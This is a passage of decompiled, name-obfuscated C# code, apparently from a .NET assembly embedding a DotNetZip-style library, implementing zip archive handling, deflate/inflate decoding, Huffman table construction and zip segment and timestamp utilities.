			class38_0.int_23 = 1 << class38_0.int_24;
			class38_0.int_25 = class38_0.int_23 - 1;
			class38_0.int_29 = int_1 + 7;
			class38_0.int_28 = 1 << class38_0.int_29;
			class38_0.int_30 = class38_0.int_28 - 1;
			class38_0.int_31 = (class38_0.int_29 + Class38.int_14 - 1) / Class38.int_14;
			class38_0.byte_1 = new byte[class38_0.int_23 * 2];
			class38_0.short_0 = new short[class38_0.int_23];
			class38_0.short_1 = new short[class38_0.int_28];
			class38_0.int_44 = 1 << int_1 + 6;
			class38_0.byte_0 = new byte[class38_0.int_44 * 4];
			class38_0.int_46 = class38_0.int_44;
			class38_0.int_43 = 3 * class38_0.int_44;
			class38_0.enum20_0 = enum20_0;
			class38_0.enum21_0 = enum21_0;
			Class6.smethod_385(class38_0);
			return 0;
		}
		throw new GException0("windowBits must be in the range 9..15.");
	}

	static void smethod_565(Class73.Class77 class77_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				array[num]++;
			}
		}
		int num2 = 0;
		int num3 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num2;
			num2 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num4 = array2[j] & 0x1FF80;
				int num5 = num2 & 0x1FF80;
				num3 += num5 - num4 >> 16 - j;
			}
		}
		class77_0.short_0 = new short[num3];
		int num6 = 512;
		for (int num7 = 15; num7 >= 10; num7--)
		{
			int num8 = num2 & 0x1FF80;
			num2 -= array[num7] << 16 - num7;
			int num9 = num2 & 0x1FF80;
			for (int k = num9; k < num8; k += 128)
			{
				class77_0.short_0[Class6.smethod_309(k)] = (short)((-num6 << 4) | num7);
				num6 += 1 << num7 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num10 = byte_0[l];
			if (num10 == 0)
			{
				continue;
			}
			num2 = array2[num10];
			int num11 = Class6.smethod_309(num2);
			if (num10 <= 9)
			{
				do
				{
					class77_0.short_0[num11] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < 512);
			}
			else
			{
				int num12 = class77_0.short_0[num11 & 0x1FF];
				int num13 = 1 << (num12 & 0xF);
				num12 = -(num12 >> 4);
				do
				{
					class77_0.short_0[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < num13);
			}
			array2[num10] = num2 + (1 << 16 - num10);
		}
	}

	static void smethod_566(Class32 class32_0)
	{
		class32_0.int_7 = Class32.int_15 * class32_0.int_3;
		class32_0.int_6 = 0;
		class32_0.bool_1 = false;
		class32_0.bool_0 = true;
		Class6.smethod_376(class32_0);
		if (class32_0.bool_0 && class32_0.int_6 > class32_0.int_7)
		{
			Class6.smethod_457(class32_0);
			class32_0.int_6 = 0;
			class32_0.int_7 = 0;
			class32_0.bool_0 = false;
			Class6.smethod_376(class32_0);
		}
		int[] int_ = class32_0.class33_0.int_13;
		class32_0.int_8 = -1;
		int num = 0;
		int int_2 = class32_0.int_3;
		while (true)
		{
			if (num <= int_2)
			{
				if (int_[num] == 0)
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		class32_0.int_8 = num;
	}

	static GClass0 smethod_567(string string_0, string string_1, GClass1 gclass1_0)
	{
		return Class6.smethod_587(string_0, gclass1_0, string_1, Encoding.Default);
	}

	static int smethod_568(Stream stream_0)
	{
		return Class6.smethod_455("Could not read block - no data!  (position 0x{0:X8})", stream_0);
	}

	static void smethod_569(ICollection<string> icollection_0, GClass1 gclass1_0)
	{
		if (icollection_0 == null)
		{
			throw new ArgumentNullException("entriesToRemove");
		}
		foreach (string item in icollection_0)
		{
			Class6.smethod_500(item, gclass1_0);
		}
	}

	static int smethod_570(Class31 class31_0)
	{
		return class31_0.int_1;
	}

	static string smethod_571(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
	{
		if (uint_0 >= 99)
		{
			zipSegmentedStream_0.bool_0 = true;
			throw new OverflowException("The number of zip segments would exceed 99.");
		}
		return $"{Path.Combine(Path.GetDirectoryName(zipSegmentedStream_0.string_0), Path.GetFileNameWithoutExtension(zipSegmentedStream_0.string_0))}.z{uint_0 + 1:D2}";
	}

	static int smethod_572(Class40 class40_0, int[] int_0, int int_1, GClass2 gclass2_0, int int_2, Class42 class42_0, int[] int_3, int int_4, int int_5)
	{
		int int_6 = gclass2_0.int_0;
		int num = gclass2_0.int_1;
		int num2 = class40_0.int_9;
		int num3 = class40_0.int_8;
		int num4 = class40_0.int_13;
		int num5 = ((num4 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
		int num6 = Class41.int_0[int_5];
		int num7 = Class41.int_0[int_4];
		int num12;
		while (true)
		{
			if (num3 < 20)
			{
				num--;
				num2 |= (gclass2_0.byte_0[int_6++] & 0xFF) << num3;
				num3 += 8;
				continue;
			}
			int num8 = num2 & num6;
			int[] array = int_3;
			int num9 = int_1;
			int num10 = (num9 + num8) * 3;
			int num11;
			if ((num11 = array[num10]) == 0)
			{
				num2 >>= array[num10 + 1];
				num3 -= array[num10 + 1];
				class40_0.byte_0[num4++] = (byte)array[num10 + 2];
				num5--;
			}
			else
			{
				while (true)
				{
					num2 >>= array[num10 + 1];
					num3 -= array[num10 + 1];
					if ((num11 & 0x10) == 0)
					{
						if ((num11 & 0x40) == 0)
						{
							num8 += array[num10 + 2];
							num8 += num2 & Class41.int_0[num11];
							num10 = (num9 + num8) * 3;
							if ((num11 = array[num10]) == 0)
							{
								num2 >>= array[num10 + 1];
								num3 -= array[num10 + 1];
								class40_0.byte_0[num4++] = (byte)array[num10 + 2];
								num5--;
								break;
							}
							continue;
						}
						if (((uint)num11 & 0x20u) != 0)
						{
							num12 = gclass2_0.int_1 - num;
							num12 = ((num3 >> 3 < num12) ? (num3 >> 3) : num12);
							num += num12;
							int_6 -= num12;
							num3 -= num12 << 3;
							class40_0.int_9 = num2;
							class40_0.int_8 = num3;
							gclass2_0.int_1 = num;
							gclass2_0.long_0 += int_6 - gclass2_0.int_0;
							gclass2_0.int_0 = int_6;
							class40_0.int_13 = num4;
							return 1;
						}
						gclass2_0.string_0 = "invalid literal/length code";
						num12 = gclass2_0.int_1 - num;
						num12 = ((num3 >> 3 < num12) ? (num3 >> 3) : num12);
						num += num12;
						int_6 -= num12;
						num3 -= num12 << 3;
						class40_0.int_9 = num2;
						class40_0.int_8 = num3;
						gclass2_0.int_1 = num;
						gclass2_0.long_0 += int_6 - gclass2_0.int_0;
						gclass2_0.int_0 = int_6;
						class40_0.int_13 = num4;
						return -3;
					}
					num11 &= 0xF;
					num12 = array[num10 + 2] + (num2 & Class41.int_0[num11]);
					num2 >>= num11;
					for (num3 -= num11; num3 < 15; num3 += 8)
					{
						num--;
						num2 |= (gclass2_0.byte_0[int_6++] & 0xFF) << num3;
					}
					num8 = num2 & num7;
					array = int_0;
					num9 = int_2;
					num10 = (num9 + num8) * 3;
					num11 = array[num10];
					while (true)
					{
						num2 >>= array[num10 + 1];
						num3 -= array[num10 + 1];
						if (((uint)num11 & 0x10u) != 0)
						{
							break;
						}
						if ((num11 & 0x40) == 0)
						{
							num8 += array[num10 + 2];
							num8 += num2 & Class41.int_0[num11];
							num10 = (num9 + num8) * 3;
							num11 = array[num10];
							continue;
						}
						gclass2_0.string_0 = "invalid distance code";
						num12 = gclass2_0.int_1 - num;
						num12 = ((num3 >> 3 < num12) ? (num3 >> 3) : num12);
						num += num12;
						int_6 -= num12;
						num3 -= num12 << 3;
						class40_0.int_9 = num2;
						class40_0.int_8 = num3;
						gclass2_0.int_1 = num;
						gclass2_0.long_0 += int_6 - gclass2_0.int_0;
						gclass2_0.int_0 = int_6;
						class40_0.int_13 = num4;
						return -3;
					}
					for (num11 &= 0xF; num3 < num11; num3 += 8)
					{
						num--;
						num2 |= (gclass2_0.byte_0[int_6++] & 0xFF) << num3;
					}
					int num13 = array[num10 + 2] + (num2 & Class41.int_0[num11]);
					num2 >>= num11;
					num3 -= num11;
					num5 -= num12;
					int num14;
					if (num4 >= num13)
					{
						num14 = num4 - num13;
						if (num4 - num14 > 0 && 2 > num4 - num14)
						{
							class40_0.byte_0[num4++] = class40_0.byte_0[num14++];
							class40_0.byte_0[num4++] = class40_0.byte_0[num14++];
							num12 -= 2;
						}
						else
						{
							Array.Copy(class40_0.byte_0, num14, class40_0.byte_0, num4, 2);
							num4 += 2;
							num14 += 2;
							num12 -= 2;
						}
					}
					else
					{
						num14 = num4 - num13;
						do
						{
							num14 += class40_0.int_11;
						}
						while (num14 < 0);
						num11 = class40_0.int_11 - num14;
						if (num12 > num11)
						{
							num12 -= num11;
							if (num4 - num14 > 0 && num11 > num4 - num14)
							{
								do
								{
									class40_0.byte_0[num4++] = class40_0.byte_0[num14++];
								}
								while (--num11 != 0);
							}
							else
							{
								Array.Copy(class40_0.byte_0, num14, class40_0.byte_0, num4, num11);
								num4 += num11;
								num14 += num11;
								num11 = 0;
							}
							num14 = 0;
						}
					}
					if (num4 - num14 > 0 && num12 > num4 - num14)
					{
						do
						{
							class40_0.byte_0[num4++] = class40_0.byte_0[num14++];
						}
						while (--num12 != 0);
						break;
					}
					Array.Copy(class40_0.byte_0, num14, class40_0.byte_0, num4, num12);
					num4 += num12;
					num14 += num12;
					num12 = 0;
					break;
				}
			}
			if (num5 < 258 || num < 10)
			{
				break;
			}
		}
		num12 = gclass2_0.int_1 - num;
		num12 = ((num3 >> 3 < num12) ? (num3 >> 3) : num12);
		num += num12;
		int_6 -= num12;
		num3 -= num12 << 3;
		class40_0.int_9 = num2;
		class40_0.int_8 = num3;
		gclass2_0.int_1 = num;
		gclass2_0.long_0 += int_6 - gclass2_0.int_0;
		gclass2_0.int_0 = int_6;
		class40_0.int_13 = num4;
		return 0;
	}

	static Enum8 smethod_573(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.enum8_0;
		}
		return class8_0.stream0_0.enum8_0;
	}

	static void smethod_574(IEnumerable<string> ienumerable_0, GClass1 gclass1_0, string string_0)
	{
		Class6.smethod_223(ienumerable_0, gclass1_0, bool_0: false, string_0);
	}

	static int smethod_575(ICollection<GClass0> icollection_0)
	{
		int num = 0;
		foreach (GClass0 item in icollection_0)
		{
			if (!item.bool_9)
			{
				num++;
			}
		}
		return num;
	}

	static byte[] smethod_576(Class56 class56_0)
	{
		return class56_0.byte_1;
	}

	static void smethod_577(string string_0, GClass1 gclass1_0, GClass0 gclass0_0)
	{
		gclass1_0.dictionary_0.Add(string_0, gclass0_0);
		gclass1_0.list_0 = null;
		gclass1_0.bool_5 = true;
	}

	static Stream13 smethod_578(GClass0 gclass0_0)
	{
		if (gclass0_0.class8_0.gclass1_0 == null)
		{
			throw new InvalidOperationException("Use OpenReader() only with ZipFile.");
		}
		return Class6.smethod_176(gclass0_0, gclass0_0.string_3 ?? Class6.smethod_363(gclass0_0.class8_0));
	}

	static int smethod_579(DateTime dateTime_0)
	{
		dateTime_0 = dateTime_0.ToLocalTime();
		ushort num = (ushort)(((uint)dateTime_0.Day & 0x1Fu) | ((uint)(dateTime_0.Month << 5) & 0x1E0u) | ((uint)(dateTime_0.Year - 1980 << 9) & 0xFE00u));
		ushort num2 = (ushort)(((uint)(dateTime_0.Second / 2) & 0x1Fu) | ((uint)(dateTime_0.Minute << 5) & 0x7E0u) | ((uint)(dateTime_0.Hour << 11) & 0xF800u));
		return (num << 16) | num2;
	}

	static void smethod_580(Class38 class38_0, bool bool_0)
	{
		Class6.smethod_283(class38_0, (class38_0.int_32 >= 0) ? class38_0.int_32 : (-1), class38_0.int_36 - class38_0.int_32, bool_0);
		class38_0.int_32 = class38_0.int_36;
		Class6.smethod_243(class38_0.gclass2_0);
	}

	static void smethod_581(SelfExtractorFlavor selfExtractorFlavor_0, GClass1 gclass1_0, string string_0)
	{
		Class30 @class = new Class30();
		@class.method_1(selfExtractorFlavor_0);
		Class6.smethod_145(@class, string_0, gclass1_0);
	}

	static bool smethod_582(Stream6 stream6_0)
	{
		int num = Class6.smethod_532(stream6_0, 1);
		return num != 0;
	}

	static void smethod_583(Class21 class21_0, byte byte_0)
	{
		uint[] uint_ = class21_0.uint_0;
		GClass3 gclass3_ = class21_0.gclass3_0;
		int int_ = (int)class21_0.uint_0[0];
		uint_[0] = (uint)Class6.smethod_636(int_, gclass3_, byte_0);
		class21_0.uint_0[1] = class21_0.uint_0[1] + (byte)class21_0.uint_0[0];
		class21_0.uint_0[1] = class21_0.uint_0[1] * 134775813 + 1;
		uint[] uint_2 = class21_0.uint_0;
		gclass3_ = class21_0.gclass3_0;
		int_ = (int)class21_0.uint_0[2];
		byte byte_ = (byte)(class21_0.uint_0[1] >> 24);
		uint_2[2] = (uint)Class6.smethod_636(int_, gclass3_, byte_);
	}

	static void smethod_584(Class40 class40_0, byte[] byte_0, int int_0, int int_1)
	{
		Array.Copy(byte_0, int_0, class40_0.byte_0, 0, int_1);
		class40_0.int_12 = (class40_0.int_13 = int_1);
	}

	static void smethod_585(GClass0 gclass0_0)
	{
		gclass0_0.int_5++;
		long position = gclass0_0.ArchiveStream.Position;
		gclass0_0.ArchiveStream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
		byte[] array = new byte[30];
		gclass0_0.ArchiveStream.Read(array, 0, array.Length);
		short num = (short)(array[26] + array[27] * 256);
		short short_ = (short)(array[28] + array[29] * 256);
		gclass0_0.ArchiveStream.Seek(num, SeekOrigin.Current);
		Class6.smethod_518(short_, gclass0_0, gclass0_0.ArchiveStream);
		gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
		gclass0_0.int_5--;
	}

	static Class38.Class39 smethod_586(Enum20 enum20_0)
	{
		return Class38.Class39.class39_0[(int)enum20_0];
	}

	static GClass0 smethod_587(string string_0, GClass1 gclass1_0, string string_1, Encoding encoding_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		StreamWriter streamWriter = new StreamWriter(memoryStream, encoding_0);
		streamWriter.Write(string_0);
		streamWriter.Flush();
		memoryStream.Seek(0L, SeekOrigin.Begin);
		return Class6.smethod_479((Stream)memoryStream, string_1, gclass1_0);
	}

	static int smethod_588(int int_0, int int_1)
	{
		return (int)((uint)int_0 >> int_1);
	}

	static void smethod_589(GClass0 gclass0_0, string string_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null)
		{
			gclass0_0.bool_12 = Class6.smethod_543(gclass0_0, string_0, gclass0_0.class8_0.gclass1_0);
		}
	}

	static void smethod_590(GClass0 gclass0_0, int int_0)
	{
		if (int_0 > 1)
		{
			gclass0_0.short_8 = 0;
		}
		else if (gclass0_0.bool_4)
		{
			gclass0_0.short_8 = 0;
		}
		else
		{
			if (gclass0_0.enum0_0 == Enum0.const_3)
			{
				return;
			}
			if (gclass0_0.enum0_0 == Enum0.const_2)
			{
				if (gclass0_0.stream_1 != null && gclass0_0.stream_1.CanSeek)
				{
					long length = gclass0_0.stream_1.Length;
					if (length == 0L)
					{
						gclass0_0.short_8 = 0;
						return;
					}
				}
			}
			else if (gclass0_0.enum0_0 == Enum0.const_1 && Class6.smethod_545(gclass0_0.string_0) == 0L)
			{
				gclass0_0.short_8 = 0;
				return;
			}
			if (gclass0_0.SetCompression != null)
			{
				gclass0_0.CompressionLevel = gclass0_0.SetCompression(gclass0_0.string_0, gclass0_0.string_1);
			}
			if (gclass0_0.enum20_0 == Enum20.const_0 && gclass0_0.short_8 == 8)
			{
				gclass0_0.short_8 = 0;
			}
		}
	}

	static int smethod_591(GClass2 gclass2_0)
	{
		if (gclass2_0.class38_0 == null)
		{
			throw new GException0("No Deflate State!");
		}
		gclass2_0.class38_0 = null;
		return 0;
	}

	static int smethod_592(Class43 class43_0)
	{
		if (class43_0.enum17_0 != Class43.Enum17.const_13)
		{
			class43_0.enum17_0 = Class43.Enum17.const_13;
			class43_0.int_1 = 0;
		}
		int num;
		if ((num = class43_0.gclass2_0.int_1) == 0)
		{
			return -5;
		}
		int num2 = class43_0.gclass2_0.int_0;
		int num3 = class43_0.int_1;
		while (num != 0 && num3 < 4)
		{
			num3 = ((class43_0.gclass2_0.byte_0[num2] != Class43.byte_0[num3]) ? ((class43_0.gclass2_0.byte_0[num2] == 0) ? (4 - num3) : 0) : (num3 + 1));
			num2++;
			num--;
		}
		class43_0.gclass2_0.long_0 += num2 - class43_0.gclass2_0.int_0;
		class43_0.gclass2_0.int_0 = num2;
		class43_0.gclass2_0.int_1 = num;
		class43_0.int_1 = num3;
		if (num3 != 4)
		{
			return -3;
		}
		long long_ = class43_0.gclass2_0.long_0;
		long long_2 = class43_0.gclass2_0.long_1;
		Class6.smethod_198(class43_0);
		class43_0.gclass2_0.long_0 = long_;
		class43_0.gclass2_0.long_1 = long_2;
		class43_0.enum17_0 = Class43.Enum17.const_7;
		return 0;
	}

	static void smethod_593(int int_0, Class73.Class75 class75_0, int int_1, byte[] byte_0)
	{
		if (class75_0.int_0 < class75_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class75_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class75_0.int_2);
				class75_0.int_2 += 8;
			}
			class75_0.byte_0 = byte_0;
			class75_0.int_0 = int_0;
			class75_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static bool smethod_594(GClass0 gclass0_0, string string_0, GClass1 gclass1_0, bool bool_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 eventArgs = (bool_0 ? Class6.smethod_310(gclass1_0.ArchiveNameForEvent, gclass0_0, string_0) : Class6.smethod_56(gclass0_0, gclass1_0.ArchiveNameForEvent, string_0));
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_9 = true;
			}
		}
		return gclass1_0.bool_9;
	}

	static Socket smethod_595(Class54 class54_0)
	{
		return class54_0.socket_0;
	}

	static void smethod_596(EventArgs0 eventArgs0_0, string string_0)
	{
		eventArgs0_0.string_0 = string_0;
	}

	static GClass0 smethod_597(object object_0, string string_0, Enum0 enum0_0, object object_1)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			throw new ZipException("The entry name must be non-null and non-empty.");
		}
		GClass0 gClass = new GClass0();
		gClass.short_0 = 45;
		gClass.enum0_0 = enum0_0;
		gClass.dateTime_1 = (gClass.dateTime_2 = (gClass.dateTime_3 = DateTime.UtcNow));
		switch (enum0_0)
		{
		case Enum0.const_2:
			gClass.stream_1 = object_0 as Stream;
			break;
		case Enum0.const_4:
			gClass.delegate0_0 = object_0 as Delegate0;
			break;
		case Enum0.const_5:
			gClass.delegate1_0 = object_0 as Delegate1;
			gClass.delegate2_0 = object_1 as Delegate2;
			break;
		case Enum0.const_0:
			gClass.enum0_0 = Enum0.const_1;
			break;
		default:
		{
			string text = object_0 as string;
			if (string.IsNullOrEmpty(text))
			{
				throw new ZipException("The filename must be non-null and non-empty.");
			}
			try
			{
				gClass.dateTime_1 = File.GetLastWriteTime(text).ToUniversalTime();
				gClass.dateTime_3 = File.GetCreationTime(text).ToUniversalTime();
				gClass.dateTime_2 = File.GetLastAccessTime(text).ToUniversalTime();
				if (File.Exists(text) || Directory.Exists(text))
				{
					gClass.int_0 = (int)File.GetAttributes(text);
				}
				gClass.bool_0 = true;
				gClass.string_0 = Path.GetFullPath(text);
			}
			catch (PathTooLongException exception_)
			{
				string string_ = $"The path is too long, filename={text}";
				throw new ZipException(string_, exception_);
			}
			break;
		}
		case Enum0.const_6:
			break;
		}
		gClass.dateTime_0 = gClass.dateTime_1;
		gClass.string_1 = Class6.smethod_260(string_0);
		return gClass;
	}

	static Enum8 smethod_598(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.enum8_0;
		}
		if (class8_0.stream1_0 != null)
		{
			throw new NotSupportedException();
		}
		return class8_0.stream0_0.enum8_0;
	}

	static string smethod_599(string string_0, string string_1)
	{
		string text = null;
		text = ((string_1 == null) ? string_0 : ((!string.IsNullOrEmpty(string_1)) ? Path.Combine(string_1, Path.GetFileName(string_0)) : Path.GetFileName(string_0)));
		return Class6.smethod_260(text);
	}

	static void smethod_600(GClass0 gclass0_0)
	{
		gclass0_0.enum2_1 = gclass0_0.enum2_0;
		gclass0_0.short_9 = gclass0_0.short_8;
		gclass0_0.bool_7 = false;
		gclass0_0.bool_6 = false;
		gclass0_0.enum0_0 = Enum0.const_3;
	}

	static GClass0 smethod_601(GClass1 gclass1_0, string string_0)
	{
		return Class6.smethod_319(string_0, gclass1_0, (string)null);
	}

	static void smethod_602(GClass2 gclass2_0)
	{
		if (gclass2_0.class38_0 == null)
		{
			throw new GException0("No Deflate State!");
		}
		Class6.smethod_385(gclass2_0.class38_0);
	}

	static void smethod_603(Class60 class60_0, Socket socket_0)
	{
		if (class60_0.socket_1 != null)
		{
			class60_0.socket_1.Close();
		}
		class60_0.socket_1 = socket_0;
	}

	static void smethod_604(string string_0, Stream10 stream10_0)
	{
		if (stream10_0.bool_0)
		{
			throw new ObjectDisposedException("GZipStream");
		}
		stream10_0.string_0 = string_0;
		if (stream10_0.string_0 != null)
		{
			if (stream10_0.string_0.IndexOf("/") != -1)
			{
				stream10_0.string_0 = stream10_0.string_0.Replace("/", "\\");
			}
			if (stream10_0.string_0.EndsWith("\\"))
			{
				throw new Exception("Illegal filename");
			}
			if (stream10_0.string_0.IndexOf("\\") != -1)
			{
				stream10_0.string_0 = Path.GetFileName(stream10_0.string_0);
			}
		}
	}

	static void smethod_605(Class73.Class75 class75_0)
	{
		class75_0.uint_0 >>= class75_0.int_2 & 7;
		class75_0.int_2 &= -8;
	}

	static void smethod_606(int int_0, Class32 class32_0)
	{
		byte[][] byte_ = class32_0.class33_0.byte_4;
		int[][] int_ = class32_0.class33_0.int_3;
		byte[] byte_2 = class32_0.class33_0.byte_1;
		char[] char_ = class32_0.class33_0.char_0;
		int int_2 = class32_0.int_10;
		int num = 0;
		int i = 0;
		while (i < int_2)
		{
			int num2 = Math.Min(i + Class35.int_6 - 1, int_2 - 1);
			int num3 = byte_2[num] & 0xFF;
			int[] array = int_[num3];
			byte[] array2 = byte_[num3];
			for (; i <= num2; i++)
			{
				int num4 = char_[i];
				int int_3 = array2[num4] & 0xFF;
				Class6.smethod_291(class32_0.class31_0, int_3, (uint)array[num4]);
			}
			i = num2 + 1;
			num++;
		}
	}

	static bool smethod_607(TextWriter textWriter_0, string string_0, bool bool_0)
	{
		GClass1 gClass = null;
		GClass1 gClass2 = null;
		bool flag = true;
		try
		{
			gClass = new GClass1();
			gClass.FullScan = true;
			Class6.smethod_338(gClass, string_0);
			gClass2 = Class6.smethod_419(string_0);
			using (IEnumerator<GClass0> enumerator = gClass.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					GClass0 current = enumerator.Current;
					using IEnumerator<GClass0> enumerator2 = gClass2.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
					while (enumerator2.MoveNext())
					{
						GClass0 current2 = enumerator2.Current;
						if (current.string_1 == current2.string_1)
						{
							if (current.long_4 != current2.long_4)
							{
								flag = false;
								textWriter_0?.WriteLine("{0}: mismatch in RelativeOffsetOfLocalHeader  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_4, current2.long_4);
							}
							if (current.long_0 != current2.long_0)
							{
								flag = false;
								textWriter_0?.WriteLine("{0}: mismatch in CompressedSize  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_0, current2.long_0);
							}
							if (current.long_2 != current2.long_2)
							{
								flag = false;
								textWriter_0?.WriteLine("{0}: mismatch in UncompressedSize  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_2, current2.long_2);
							}
							if (current.short_8 != current2.short_8)
							{
								flag = false;
								textWriter_0?.WriteLine("{0}: mismatch in CompressionMethod  (0x{1:X4} != 0x{2:X4})", current.string_1, (CompressionMethod)current.short_8, (CompressionMethod)current2.short_8);
							}
							if (current.int_2 != current2.int_2)
							{
								flag = false;
								textWriter_0?.WriteLine("{0}: mismatch in Crc32  (0x{1:X4} != 0x{2:X4})", current.string_1, current.int_2, current2.int_2);
							}
							break;
						}
					}
				}
			}
			gClass2.System_002EIDisposable_002EDispose();
			gClass2 = null;
			if (!flag)
			{
				if (bool_0)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(string_0);
					fileNameWithoutExtension = $"{fileNameWithoutExtension}_fixed.zip";
					Class6.smethod_55(gClass, fileNameWithoutExtension);
					return flag;
				}
				return flag;
			}
			return flag;
		}
		finally
		{
			gClass?.System_002EIDisposable_002EDispose();
			gClass2?.System_002EIDisposable_002EDispose();
		}
	}

	static void smethod_608(string string_0, Class61 class61_0)
	{
		class61_0.string_2 = string_0;
	}

	static DateTime smethod_609(DateTime dateTime_0)
	{
		if (dateTime_0.Kind == DateTimeKind.Utc)
		{
			return dateTime_0;
		}
		DateTime result = dateTime_0;
		if (DateTime.Now.IsDaylightSavingTime() && !dateTime_0.IsDaylightSavingTime())
		{
			result = dateTime_0 - new TimeSpan(1, 0, 0);
		}
		else if (!DateTime.Now.IsDaylightSavingTime() && dateTime_0.IsDaylightSavingTime())
		{
			result = dateTime_0 + new TimeSpan(1, 0, 0);
		}
		return result;
	}

	static Enum9 smethod_610(Stream0 stream0_0)
	{
		return stream0_0.enum9_0;
	}

	static void smethod_611(Enum3 enum3_0, GClass0 gclass0_0, string string_0)
	{
		gclass0_0.ExtractExistingFile = enum3_0;
		Class6.smethod_497((string)null, (Stream)null, string_0, gclass0_0);
	}

	static void smethod_612(EventArgs0 eventArgs0_0, long long_0)
	{
		eventArgs0_0.long_1 = long_0;
	}

	static void smethod_613(GClass1 gclass1_0, GClass0 gclass0_0)
	{
		if (gclass0_0 == null)
		{
			throw new ArgumentNullException("entry");
		}
		gclass1_0.dictionary_0.Remove(Class6.smethod_260(gclass0_0.string_1));
		gclass1_0.list_0 = null;
		gclass1_0.bool_5 = true;
	}

	static void smethod_614(string string_0, Class61 class61_0)
	{
		class61_0.string_3 = string_0;
	}

	static void smethod_615(GClass0 gclass0_0, EventArgs0 eventArgs0_0)
	{
		eventArgs0_0.gclass0_0 = gclass0_0;
	}

	static string smethod_616(int int_0, string string_0, string string_1)
	{
		byte[] inArray = Class6.smethod_164(int_0, string_0, Encoding.UTF8.GetBytes(string_1));
		return Convert.ToBase64String(inArray);
	}

	static void smethod_617(GClass1 gclass1_0)
	{
		try
		{
			bool flag = false;
			gclass1_0.bool_8 = false;
			gclass1_0.uint_1 = 0u;
			Class6.smethod_549(gclass1_0);
			if (gclass1_0.WriteStream == null)
			{
				throw new BadStateException("You haven't specified where to save the zip.");
			}
			if (gclass1_0.string_0 != null && gclass1_0.string_0.EndsWith(".exe") && !gclass1_0.bool_13)
			{
				throw new BadStateException("You specified an EXE for a plain zip file.");
			}
			if (!gclass1_0.bool_5)
			{
				Class6.smethod_484(gclass1_0);
				if (gclass1_0.textWriter_0 != null)
				{
					gclass1_0.textWriter_0.WriteLine("No save is necessary....");
				}
				return;
			}
			gclass1_0.method_0(bool_18: true);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("saving....");
			}
			if (gclass1_0.dictionary_0.Count >= 65535 && gclass1_0.enum8_0 == Enum8.const_0)
			{
				throw new ZipException("The number of entries is 65535 or greater. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
			}
			int num = 0;
			ICollection<GClass0> collection = (gclass1_0.SortEntriesBeforeSaving ? gclass1_0.EntriesSorted : gclass1_0.Entries);
			foreach (GClass0 item in collection)
			{
				Class6.smethod_666(num, item, gclass1_0, bool_0: true);
				Class6.smethod_542(gclass1_0.WriteStream, item);
				if (!gclass1_0.bool_8)
				{
					num++;
					Class6.smethod_666(num, item, gclass1_0, bool_0: false);
					if (!gclass1_0.bool_8)
					{
						if (!item.bool_9)
						{
							bool num2 = flag;
							bool? nullable_ = item.nullable_2;
							flag = num2 | nullable_.Value;
						}
						continue;
					}
					break;
				}
				break;
			}
			if (gclass1_0.bool_8)
			{
				return;
			}
			ZipSegmentedStream zipSegmentedStream = gclass1_0.WriteStream as ZipSegmentedStream;
			gclass1_0.uint_1 = zipSegmentedStream?.uint_0 ?? 1;
			Stream writeStream = gclass1_0.WriteStream;
			uint uint_ = gclass1_0.uint_1;
			Enum8 enum8_ = gclass1_0.enum8_0;
			string string_ = gclass1_0.string_2;
			Class8 class8_ = new Class8(gclass1_0);
			bool flag2 = Class6.smethod_429(enum8_, collection, uint_, class8_, writeStream, string_);
			Class6.smethod_364(gclass1_0, Enum6.const_12);
			gclass1_0.bool_6 = true;
			gclass1_0.bool_5 = false;
			flag = flag || flag2;
			gclass1_0.nullable_0 = flag;
			if (gclass1_0.string_0 != null && (gclass1_0.string_4 != null || zipSegmentedStream != null))
			{
				gclass1_0.WriteStream.Dispose();
				if (gclass1_0.bool_8)
				{
					return;
				}
				if (gclass1_0.bool_4 && gclass1_0.stream_0 != null)
				{
					gclass1_0.stream_0.Close();
					gclass1_0.stream_0 = null;
					foreach (GClass0 item2 in collection)
					{
						if (item2.stream_0 is ZipSegmentedStream zipSegmentedStream2)
						{
							zipSegmentedStream2.Dispose();
						}
						item2.stream_0 = null;
					}
				}
				string text = null;
				if (File.Exists(gclass1_0.string_0))
				{
					text = gclass1_0.string_0 + "." + Path.GetRandomFileName();
					if (File.Exists(text))
					{
						Class6.smethod_88(gclass1_0, text);
					}
